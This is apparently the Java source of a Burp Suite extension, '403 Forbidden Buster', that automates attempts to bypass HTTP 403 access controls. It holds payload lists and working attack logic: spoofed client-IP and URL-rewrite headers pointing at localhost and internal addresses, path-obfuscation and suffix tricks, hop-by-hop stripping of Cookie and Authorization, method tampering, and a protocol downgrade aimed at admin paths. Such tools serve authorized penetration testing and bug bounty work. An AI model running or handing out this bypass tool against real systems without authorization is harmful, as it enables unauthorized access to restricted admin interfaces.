package com.bughunter;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.persistence.Preferences;
import burp.api.montoya.ui.UserInterface;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.contextmenu.MessageEditorHttpRequestResponse;
import burp.api.montoya.ui.editor.EditorOptions;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.border.TitledBorder;
import javax.swing.table.AbstractTableModel;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider {

    private MontoyaApi api;
    private Preferences preferences;
    private final BypassTableModel tableModel = new BypassTableModel();
    private final ExecutorService executor = Executors.newFixedThreadPool(15);

    // UI Components
    private HttpRequestEditor requestViewer;
    private HttpResponseEditor responseViewer;
    private JTextArea ipConfigArea;
    private JTextArea pathConfigArea;
    private JSlider rateLimitSlider;
    private JLabel rateLimitLabel;

    // Defaults
    private static final String DEFAULT_IPS = "127.0.0.1\nlocalhost\n0.0.0.0\n192.168.0.1\n10.0.0.1\n::1\n127.0.0.2";
    private static final String DEFAULT_PATHS = "/admin\n/dashboard\n/login\n/panel\n/console\n/manager\n/administrator\n/private\n/internal\n/sysadmin\n/auth";
    private static final int DEFAULT_DELAY = 50; // ms

    // --- PAYLOAD LISTS ---
    private static final List<String> BYPASS_HEADERS = Arrays.asList(
            "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-For", "X-Forwarded-Host",
            "X-Host", "X-Custom-IP-Authorization", "Client-IP", "X-Remote-IP",
            "X-Originating-IP", "Fastly-Client-IP", "True-Client-IP", "Referer",
            "X-Client-IP", "X-Real-IP", "X-Forwarded-Server", "X-Wap-Profile", "X-ProxyUser-Ip"
    );
    private static final List<String> PATH_OBFUSCATION = Arrays.asList(
            "/.", "//", "/./", "/;", "/.;", "//;", "/..;/", "/%2e/", "/%2f", "/admin/.",
            "/%252e/", "/%ef%bc%8f", "/%u002e/", "%09", "%20", "%00"
    );
    private static final List<String> SUFFIX_PAYLOADS = Arrays.asList(
            "?", "??", "&", "#", "%09", "%20",
            ".json", ".css", ".png", ".js", ".html", ".ico",
            ";jsessionid=1337", ";type=a", "/", "/."
    );

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.preferences = api.persistence().preferences();
        api.extension().setName("403 Forbidden Buster (Gold v5.1)");

        SwingUtilities.invokeLater(() -> {
            // --- TAB 1: MONITOR ---
            JTable table = new JTable(tableModel);
            table.setFont(new Font("SansSerif", Font.PLAIN, 12));
            table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);

            UserInterface ui = api.userInterface();
            requestViewer = ui.createHttpRequestEditor(EditorOptions.READ_ONLY);
            responseViewer = ui.createHttpResponseEditor(EditorOptions.READ_ONLY);

            table.getSelectionModel().addListSelectionListener(e -> {
                if (!e.getValueIsAdjusting()) {
                    int selectedRow = table.getSelectedRow();
                    if (selectedRow != -1) {
                        BypassResult result = tableModel.getResult(selectedRow);
                        requestViewer.setRequest(result.requestResponse.request());
                        responseViewer.setResponse(result.requestResponse.response());
                    } else {
                        requestViewer.setRequest(null);
                        responseViewer.setResponse(null);
                    }
                }
            });

            // Context Menu (Delete/Clear)
            JPopupMenu popupMenu = new JPopupMenu();
            JMenuItem deleteItem = new JMenuItem("Delete Item");
            JMenuItem clearItem = new JMenuItem("Clear History");
            deleteItem.addActionListener(e -> {
                int selectedRow = table.getSelectedRow();
                if (selectedRow != -1) tableModel.removeRow(selectedRow);
            });
            clearItem.addActionListener(e -> tableModel.clear());
            popupMenu.add(deleteItem);
            popupMenu.addSeparator();
            popupMenu.add(clearItem);

            table.addMouseListener(new MouseAdapter() {
                @Override
                public void mouseReleased(MouseEvent e) { handleContextMenu(e); }
                @Override
                public void mousePressed(MouseEvent e) { handleContextMenu(e); }
                private void handleContextMenu(MouseEvent e) {
                    if (e.isPopupTrigger()) {
                        int row = table.rowAtPoint(e.getPoint());
                        if (row != -1 && !table.isRowSelected(row)) table.setRowSelectionInterval(row, row);
                        popupMenu.show(e.getComponent(), e.getX(), e.getY());
                    }
                }
            });

            JScrollPane tableScroll = new JScrollPane(table);
            JSplitPane bottomSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, requestViewer.uiComponent(), responseViewer.uiComponent());
            bottomSplit.setResizeWeight(0.5);
            JSplitPane monitorPanel = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, bottomSplit);
            monitorPanel.setResizeWeight(0.3);

            // --- TAB 2: CONFIGURATION ---
            JPanel configPanel = new JPanel();
            configPanel.setLayout(new BoxLayout(configPanel, BoxLayout.Y_AXIS));

            // 1. IP Config Area
            JPanel ipPanel = new JPanel(new BorderLayout());
            ipPanel.setBorder(new TitledBorder("IP Spoofing List (One per line)"));
            String savedIps = preferences.getString("ips");
            ipConfigArea = new JTextArea(savedIps != null ? savedIps : DEFAULT_IPS);
            ipPanel.add(new JScrollPane(ipConfigArea), BorderLayout.CENTER);
            ipPanel.setPreferredSize(new Dimension(800, 200));

            // 2. Path Config Area
            JPanel pathPanel = new JPanel(new BorderLayout());
            pathPanel.setBorder(new TitledBorder("Dictionary / Path List (One per line)"));
            String savedPaths = preferences.getString("paths");
            pathConfigArea = new JTextArea(savedPaths != null ? savedPaths : DEFAULT_PATHS);
            pathPanel.add(new JScrollPane(pathConfigArea), BorderLayout.CENTER);
            pathPanel.setPreferredSize(new Dimension(800, 200));

            // 3. Rate Limit / Settings Area
            JPanel settingsPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
            settingsPanel.setBorder(new TitledBorder("Scan Settings"));

            // FIX: Retrieve as String and parse to int
            String savedDelayStr = preferences.getString("delay");
            int initialDelay = DEFAULT_DELAY;
            if (savedDelayStr != null) {
                try {
                    initialDelay = Integer.parseInt(savedDelayStr);
                } catch (NumberFormatException e) {
                    initialDelay = DEFAULT_DELAY;
                }
            }

            rateLimitLabel = new JLabel("Request Delay: " + initialDelay + " ms");
            rateLimitSlider = new JSlider(0, 1000, initialDelay);
            rateLimitSlider.setMajorTickSpacing(100);
            rateLimitSlider.setPaintTicks(true);
            rateLimitSlider.addChangeListener(e -> {
                int val = rateLimitSlider.getValue();
                rateLimitLabel.setText("Request Delay: " + val + " ms");
                saveSettings(); // Save on change
            });

            JButton saveButton = new JButton("Save Configuration");
            saveButton.addActionListener(e -> {
                saveSettings();
                JOptionPane.showMessageDialog(null, "Settings Saved!");
            });

            settingsPanel.add(rateLimitLabel);
            settingsPanel.add(rateLimitSlider);
            settingsPanel.add(Box.createHorizontalStrut(20));
            settingsPanel.add(saveButton);
            settingsPanel.setMaximumSize(new Dimension(2000, 80));

            configPanel.add(settingsPanel);
            configPanel.add(ipPanel);
            configPanel.add(pathPanel);

            // --- MAIN TABS ---
            JTabbedPane tabs = new JTabbedPane();
            tabs.addTab("Monitor Results", monitorPanel);
            tabs.addTab("Configuration", configPanel);

            api.userInterface().registerSuiteTab("403 Buster", tabs);
        });

        api.userInterface().registerContextMenuItemsProvider(this);
        api.logging().logToOutput("403 Buster Gold v5.1 Loaded.");
    }

    private void saveSettings() {
        preferences.setString("ips", ipConfigArea.getText());
        preferences.setString("paths", pathConfigArea.getText());
        // FIX: Store as String
        preferences.setString("delay", String.valueOf(rateLimitSlider.getValue()));
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        if (event.messageEditorRequestResponse().isEmpty()) return null;
        JMenuItem bypassItem = new JMenuItem("Bypass 403 Forbidden");
        MessageEditorHttpRequestResponse editor = event.messageEditorRequestResponse().get();
        bypassItem.addActionListener(l -> executor.submit(() -> startAttack(editor.requestResponse())));
        List<Component> menuList = new ArrayList<>();
        menuList.add(bypassItem);
        return menuList;
    }

    private void startAttack(HttpRequestResponse baseRequestResponse) {
        // Save automatically before starting
        saveSettings();

        HttpRequest originalRequest = baseRequestResponse.request();
        String originalPath = originalRequest.path();
        String host = baseRequestResponse.httpService().host();
        String scheme = baseRequestResponse.httpService().secure() ? "https://" : "http://";

        // Read Settings
        List<String> userIPs = Arrays.stream(ipConfigArea.getText().split("\\n"))
                .map(String::trim).filter(s -> !s.isEmpty()).collect(Collectors.toList());
        List<String> userPaths = Arrays.stream(pathConfigArea.getText().split("\\n"))
                .map(String::trim).filter(s -> !s.isEmpty()).collect(Collectors.toList());
        int delayMs = rateLimitSlider.getValue();

        api.logging().logToOutput("[-] Starting Attack: " + originalPath + " (Delay: " + delayMs + "ms)");

        // --- ATTACK LOGIC ---

        // 1. Headers + IP Spoofing
        for (String header : BYPASS_HEADERS) {
            for (String ip : userIPs) {
                HttpRequest newReq = originalRequest.withHeader(HttpHeader.httpHeader(header, ip));
                sendAndLog(newReq, "Header: " + header + " val: " + ip, baseRequestResponse, delayMs);
            }
            // Dictionary Path Swapping
            if (header.contains("URL") || header.contains("Rewrite")) {
                HttpRequest swapReq = originalRequest.withPath("/").withHeader(HttpHeader.httpHeader(header, originalPath));
                checkPathSwap(swapReq, "Path Swap (Current): / + " + header, originalRequest.withPath("/"), delayMs);

                for (String dictPath : userPaths) {
                    String cleanDictPath = dictPath.startsWith("/") ? dictPath : "/" + dictPath;
                    HttpRequest dictReq = originalRequest.withPath("/").withHeader(HttpHeader.httpHeader(header, cleanDictPath));
                    checkPathSwap(dictReq, "Dictionary Swap: " + header + " = " + cleanDictPath, originalRequest.withPath("/"), delayMs);
                }
            }
            // Referer
            if (header.equalsIgnoreCase("Referer")) {
                List<String> refs = new ArrayList<>();
                refs.add(scheme + host + originalPath);
                for(String p : userPaths) refs.add(scheme + host + (p.startsWith("/") ? p : "/" + p));

                for (String refUrl : refs) {
                    sendAndLog(originalRequest.withHeader(HttpHeader.httpHeader(header, refUrl)), "Referer: " + refUrl, baseRequestResponse, delayMs);
                }
            }
        }

        // 2. Hop-By-Hop
        List<String> hopHeaders = new ArrayList<>(BYPASS_HEADERS);
        hopHeaders.add("Cookie"); hopHeaders.add("Authorization");
        for (String hop : hopHeaders) {
            sendAndLog(originalRequest.withHeader(HttpHeader.httpHeader("Connection", "close, " + hop)), "Hop-By-Hop Strip: " + hop, baseRequestResponse, delayMs);
        }

        // 3. Path Obfuscation
        for (String payload : PATH_OBFUSCATION) {
            if (payload.startsWith("/")) {
                String cleanOriginal = originalPath.startsWith("/") ? originalPath.substring(1) : originalPath;
                sendAndLog(originalRequest.withPath(payload + cleanOriginal), "Path Prefix: " + payload, baseRequestResponse, delayMs);
            }
        }

        // 4. Case Switching
        String upperPath = originalPath.toUpperCase();
        if (!upperPath.equals(originalPath)) {
            sendAndLog(originalRequest.withPath(upperPath), "Case: UPPER", baseRequestResponse, delayMs);
        }

        // 5. Method Tampering
        sendAndLog(originalRequest.withMethod("POST").withBody(""), "Method: POST", baseRequestResponse, delayMs);
        sendAndLog(originalRequest.withMethod("TRACE"), "Method: TRACE", baseRequestResponse, delayMs);
        sendAndLog(originalRequest.withMethod("HEAD"), "Method: HEAD", baseRequestResponse, delayMs);
        sendAndLog(originalRequest.withMethod("POST").withHeader(HttpHeader.httpHeader("X-HTTP-Method-Override", "GET")), "Method Override", baseRequestResponse, delayMs);

        // 6. Suffixes
        for (String suffix : SUFFIX_PAYLOADS) {
            sendAndLog(originalRequest.withPath(originalPath + suffix), "Suffix: " + suffix, baseRequestResponse, delayMs);
        }

        // 7. Protocol Downgrade
        try {
            String rawReq = originalRequest.toString();
            Pattern p = Pattern.compile("HTTP/\\d(\\.\\d)?");
            Matcher m = p.matcher(rawReq);
            if (m.find()) {
                String downgradedRaw = m.replaceFirst("HTTP/1.0");
                HttpRequest downgradedReq = HttpRequest.httpRequest(baseRequestResponse.httpService(), downgradedRaw);
                sendAndLog(downgradedReq, "Protocol: HTTP/1.0", baseRequestResponse, delayMs);
            }
        } catch (Exception e) {}
    }

    private void checkPathSwap(HttpRequest attackReq, String description, HttpRequest baselineReq, int delayMs) {
        try {
            if (delayMs > 0) Thread.sleep(delayMs);
            HttpRequestResponse attackResponse = api.http().sendRequest(attackReq);
            short statusCode = attackResponse.response().statusCode();

            HttpRequestResponse baselineResponse = api.http().sendRequest(baselineReq);
            int attackLen = attackResponse.response().body().length();
            int baselineLen = baselineResponse.response().body().length();

            if (Math.abs(attackLen - baselineLen) > 100) {
                SwingUtilities.invokeLater(() -> tableModel.addResult(new BypassResult(
                        attackReq.method(), attackReq.url(), description, statusCode, attackLen, attackResponse
                )));
            }
        } catch (Exception e) { api.logging().logToError("Error: " + e.getMessage()); }
    }

    private void sendAndLog(HttpRequest request, String description, HttpRequestResponse original, int delayMs) {
        try {
            if (delayMs > 0) Thread.sleep(delayMs);
            HttpRequestResponse response = api.http().sendRequest(request);
            short statusCode = response.response().statusCode();
            int length = response.response().bodyToString().length();

            SwingUtilities.invokeLater(() -> tableModel.addResult(new BypassResult(
                    request.method(), request.url(), description, statusCode, length, response
            )));

        } catch (Exception e) { api.logging().logToError("Error: " + e.getMessage()); }
    }

    static class BypassTableModel extends AbstractTableModel {
        private final List<BypassResult> results = new ArrayList<>();
        private final String[] columns = {"Method", "URL", "Technique", "Status", "Length"};
        public void addResult(BypassResult result) { results.add(result); fireTableRowsInserted(results.size() - 1, results.size() - 1); }
        public void clear() { results.clear(); fireTableDataChanged(); }
        public void removeRow(int rowIndex) { if (rowIndex >= 0 && rowIndex < results.size()) { results.remove(rowIndex); fireTableRowsDeleted(rowIndex, rowIndex); } }
        public BypassResult getResult(int rowIndex) { return results.get(rowIndex); }
        @Override public int getRowCount() { return results.size(); }
        @Override public int getColumnCount() { return columns.length; }
        @Override public String getColumnName(int column) { return columns[column]; }
        @Override public Object getValueAt(int rowIndex, int columnIndex) {
            BypassResult result = results.get(rowIndex);
            switch (columnIndex) {
                case 0: return result.method;
                case 1: return result.url;
                case 2: return result.technique;
                case 3: return result.status;
                case 4: return result.length;
                default: return "";
            }
        }
    }

    static class BypassResult {
        String method, url, technique;
        int status, length;
        HttpRequestResponse requestResponse;
        public BypassResult(String method, String url, String technique, int status, int length, HttpRequestResponse requestResponse) {
            this.method = method; this.url = url; this.technique = technique; this.status = status; this.length = length; this.requestResponse = requestResponse;
        }
    }
}